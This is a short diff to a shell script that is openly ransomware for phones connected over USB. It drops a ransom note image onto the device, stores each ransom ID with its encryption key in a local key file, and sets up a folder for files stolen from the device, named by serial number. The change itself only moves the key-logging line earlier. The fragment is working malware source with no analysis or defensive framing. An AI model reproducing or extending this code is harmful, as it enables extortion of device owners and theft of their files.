@@ -13,6 +13,9 @@ gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png"
 echo "Note dropped as ransom_$ransomid.png"
 echo ""
 
+#store ransomid and encryption key pair
+echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_key >> keys/keys.txt 
+
 #make folder to store stolen files. named as device serial number and timestamp
 cd data/stolen
 deviceinfo=$(lsusb | grep -v "$oldusblist")
@@ -53,8 +56,7 @@ cd "$LOCALPATH"
 sleep 1
 gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png" 
 
-#store ransomid and encryption key pair
-echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_key >> keys/keys.txt 
+
 
 #Finish up
 echo ""
